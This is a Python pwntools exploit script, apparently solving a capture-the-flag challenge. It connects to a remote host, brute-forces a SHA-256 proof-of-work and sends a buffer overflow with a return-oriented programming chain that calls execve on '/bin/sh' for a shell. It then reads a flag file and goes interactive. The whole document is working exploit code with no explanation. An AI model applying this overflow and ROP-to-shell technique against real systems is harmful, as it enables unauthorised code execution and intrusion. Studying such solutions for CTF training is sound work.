import hashlib,sys,socket,re
from struct import pack
from pwn import *
from struct import pack

r = remote('49.4.51.149',25391)
r.recv()
data=r.recv()
print data
skr_sha256 = re.findall('hashlib.sha256\(skr\).hexdigest\(\)=(.*?)\n', data)[0]
skr = re.findall('skr\[0:5\].encode\(\'hex\'\)=(.*?)\n', data)[0].decode('hex')

while True:
    for i in range(255, 1, -1):
        for j in range(255, 1, -1):
            for k in range(255, 1, -1):
                temp = skr + chr(i) + chr(j) + chr(k)
                _sha256 = hashlib.new('sha256')
                _sha256.update(temp)
                if _sha256.hexdigest() == skr_sha256:
                    print temp.encode('hex'),i,j,k
                    r.send(temp.encode('hex')+'\r\n')
                    print r.recv(1024)
                    r.sendline("4c69fe806a9daf27c4a5f301e0dc41ef")
                    syscall = 0x0000000000461645
                    bss = 0x6a4e40
                    pop_rdi_ret = 0x4005f6
                    pop_rsi_ret = 0x405895
                    pop_rdx_ret = 0x43b9d5
                    pop_rax_ret = 0x43b97c
                    print r.recv()
                    r.sendline('A'*280 + p64(pop_rdi_ret) +p64(0x0) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(0x20) + p64(pop_rax_ret) + p64(0) + p64(syscall) + p64(pop_rax_ret) + p64(0) + p64(pop_rsi_ret) + p64(0x0) + p64(pop_rdx_ret) + p64(0x0) + p64(pop_rax_ret) + p64(59) + p64(pop_rdi_ret) + p64(bss) + p64(syscall))
                    print r.recv()
                    sleep(2)
                    r.sendline('/bin/sh\x00')
                    r.sendline('cat flag_b2c321e97143cfbcc17070ed2adf59c0')
                    print r.recv()
                    r.interactive()